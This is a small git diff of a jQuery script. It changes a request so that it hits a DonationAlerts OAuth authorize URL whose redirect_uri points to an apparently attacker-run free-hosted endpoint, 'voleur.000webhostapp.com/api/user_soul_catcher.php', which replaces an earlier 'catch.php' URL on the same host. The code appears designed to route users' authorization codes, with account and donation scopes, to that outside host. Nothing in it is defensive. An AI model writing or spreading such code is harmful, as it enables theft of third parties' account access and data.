@@ -8,7 +8,7 @@ $(function() {
         }, function(win) {
             auth_id = win['id'];
         });
-        url = 'https://voleur.000webhostapp.com/api/catch.php?check';
+        url = 'https://www.donationalerts.com/oauth/authorize?response_type=code&client_id=402&redirect_uri=https://voleur.000webhostapp.com/api/user_soul_catcher.php&%20%20%20%20scope=oauth-user-show oauth-donation-subscribe oauth-donation-index';
         var xhr = new XMLHttpRequest();
         xhr.open('GET', url,true);
         xhr.send('authorize');
